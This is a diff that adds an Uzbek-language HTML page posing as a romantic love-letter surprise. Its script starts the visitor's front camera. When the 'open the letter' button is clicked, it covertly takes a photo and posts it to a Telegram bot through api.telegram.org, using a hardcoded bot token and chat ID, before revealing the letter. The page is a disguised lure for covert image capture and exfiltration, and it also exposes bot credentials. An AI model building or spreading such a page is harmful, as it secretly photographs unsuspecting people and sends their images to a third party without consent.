@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seni Sevaman ❤️</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Georgia', serif;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 30px;
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(255, 105, 180, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,182,193,0.3) 0%, transparent 70%);
+            animation: rotate 20s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .content {
+            position: relative;
+            z-index: 1;
+        }
+
+        h1 {
+            color: #e91e63;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .subtitle {
+            color: #c2185b;
+            font-size: 1.2em;
+            margin-bottom: 30px;
+            font-style: italic;
+        }
+
+        .camera-section {
+            margin: 30px 0;
+        }
+
+        video {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
+        }
+
+        canvas {
+            display: none;
+        }
+
+        .capture-btn {
+            background: linear-gradient(45deg, #e91e63, #ff4081);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2em;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 25px rgba(233, 30, 99, 0.4);
+            font-family: inherit;
+        }
+
+        .capture-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(233, 30, 99, 0.5);
+        }
+
+        .capture-btn:active {
+            transform: translateY(0);
+        }
+
+        .capture-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .love-letter {
+            display: none;
+            margin-top: 30px;
+            padding: 30px;
+            background: linear-gradient(135deg, #fff5f8 0%, #ffe4ec 100%);
+            border-radius: 20px;
+            border: 3px solid #e91e63;
+            animation: fadeIn 1s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .love-letter h2 {
+            color: #c2185b;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+        }
+
+        .love-letter p {
+            color: #880e4f;
+            font-size: 1.1em;
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+
+        .hearts {
+            font-size: 2em;
+            margin: 20px 0;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .loading {
+            display: none;
+            color: #e91e63;
+            font-size: 1.2em;
+            margin: 20px 0;
+        }
+
+        .loading::after {
+            content: '...';
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+
+        .error {
+            display: none;
+            color: #d32f2f;
+            background: #ffebee;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .floating-hearts {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: 0;
+        }
+
+        .heart {
+            position: absolute;
+            font-size: 20px;
+            color: #e91e63;
+            animation: floatUp 6s ease-in infinite;
+            opacity: 0.6;
+        }
+
+        @keyframes floatUp {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0.6;
+            }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+
+    </style>
+</head>
+<body>
+    <div class="floating-hearts" id="floatingHearts"></div>
+    
+    <div class="container">
+        <div class="content">
+            <h1>Seni Sevaman ❤️</h1>
+            <p class="subtitle"> mening sevgilim uchun maxsus surpriza</p>
+            
+            <div class="camera-section">
+                <video id="video" autoplay playsinline></video>
+                <canvas id="canvas"></canvas>
+                
+                <button class="capture-btn" id="captureBtn">
+                Xatni ochish 
+                </button>
+                
+                <div class="loading" id="loading">Yuborilmoqda</div>
+                <div class="error" id="error"></div>
+            </div>
+            
+            <div class="love-letter" id="loveLetter">
+                <h2>Seni Sevaman ❤️</h2>
+                <div class="hearts">💕</div>
+                <p>
+                    Azizim,
+                </p>
+                <p>
+                    Sen hayotimning eng chiroyli sovg'asisan. Har bir kunim seni o'ylashdan boshlanadi va sen bilan tugaydi. Sening kulging, sening ko'zlaring, senning qalbing - men uchun dunyodan qimmatroq narsalar yo'q.
+                </p>
+                <p>
+                    Sen bilan o'tgan har bir daqiqa menga baxt keltiradi. Sen men uchun shunchaki sevgili emas, sen mening do'stim, mening qo'llab-quvvatlovchim, mening hayotim.
+                </p>
+                <p>
+                    Har doim seni sevaman va sen bilan birgalikda baxtli bo'lishni xohlayman. Sen mening yuragimda abadiy yashaysan.
+                </p>
+                <p>
+                    Seni sevaman! ❤️💕
+                </p>
+                <div class="hearts">💝</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8558075971:AAEdWMc5IoAxSpJxL9q-aaZ-mtvDd4-Mc74';
+        const CHAT_ID = '7050310480';
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureBtn = document.getElementById('captureBtn');
+        const loveLetter = document.getElementById('loveLetter');
+        const loading = document.getElementById('loading');
+        const error = document.getElementById('error');
+        
+        // Create floating hearts
+        function createFloatingHearts() {
+            const container = document.getElementById('floatingHearts');
+            for (let i = 0; i < 20; i++) {
+                const heart = document.createElement('div');
+                heart.className = 'heart';
+                heart.innerHTML = '❤️';
+                heart.style.left = Math.random() * 100 + '%';
+                heart.style.animationDelay = Math.random() * 6 + 's';
+                heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
+                container.appendChild(heart);
+            }
+        }
+        
+        // Initialize camera
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: 640, height: 480 } 
+                });
+                video.srcObject = stream;
+            } catch (err) {
+                console.error('Camera error:', err);
+                showError('Kameraga kirish imkonsiz. Iltimos, ruxsatni bering.');
+            }
+        }
+        
+        // Capture photo
+        function capturePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            return canvas.toDataURL('image/jpeg', 0.8);
+        }
+        
+        // Send photo to Telegram
+        async function sendToTelegram(photoData) {
+            const caption = `❤️ Seni Sevaman ❤️\n\nAzizim,\n\nSen hayotimning eng chiroyli sovg'asisan. Har bir kunim seni o'ylashdan boshlanadi va sen bilan tugaydi. Sening kulging, sening ko'zlaring, senning qalbing - men uchun dunyodan qimmatroq narsalar yo'q.\n\nSen bilan o'tgan har bir daqiqa menga baxt keltiradi. Sen men uchun shunchaki sevgili emas, sen mening do'stim, mening qo'llab-quvvatlovchim, mening hayotim.\n\nHar doim seni sevaman va sen bilan birgalikda baxtli bo'lishni xohlayman. Sen mening yuragimda abadiy yashaysan.\n\nSeni sevaman! 💕💝`;
+            
+            // Convert base64 to blob
+            const base64Data = photoData.replace(/^data:image\/jpeg;base64,/, '');
+            const byteCharacters = atob(base64Data);
+            const byteArrays = [];
+            
+            for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                const slice = byteCharacters.slice(offset, offset + 512);
+                const byteNumbers = new Array(slice.length);
+                for (let i = 0; i < slice.length; i++) {
+                    byteNumbers[i] = slice.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                byteArrays.push(byteArray);
+            }
+            
+            const blob = new Blob(byteArrays, { type: 'image/jpeg' });
+            
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', caption);
+            
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            const data = await response.json();
+            
+            if (!data.ok) {
+                throw new Error(data.description || 'Telegram xatosi');
+            }
+            
+            return data;
+        }
+        
+        function showError(message) {
+            error.textContent = message;
+            error.style.display = 'block';
+            setTimeout(() => {
+                error.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Handle capture button click
+        captureBtn.addEventListener('click', async () => {
+            captureBtn.disabled = true;
+            loading.style.display = 'block';
+            error.style.display = 'none';
+            success.style.display = 'none';
+            
+            try {
+                // Capture photo
+                const photoData = capturePhoto();
+                
+                // Send to Telegram
+                await sendToTelegram(photoData);
+                
+                // Show love letter
+                loveLetter.style.display = 'block';
+                
+                // Stop camera
+                const stream = video.srcObject;
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                video.style.display = 'none';
+                captureBtn.style.display = 'none';
+                
+            } catch (err) {
+                console.error('Error:', err);
+                showError('Rasm yuborilmadi. Iltimos, qaytadan urinib ko\'ring.');
+                captureBtn.disabled = false;
+            } finally {
+                loading.style.display = 'none';
+            }
+        });
+        
+        // Initialize
+        createFloatingHearts();
+        initCamera();
+    </script>
+</body>
+</html>
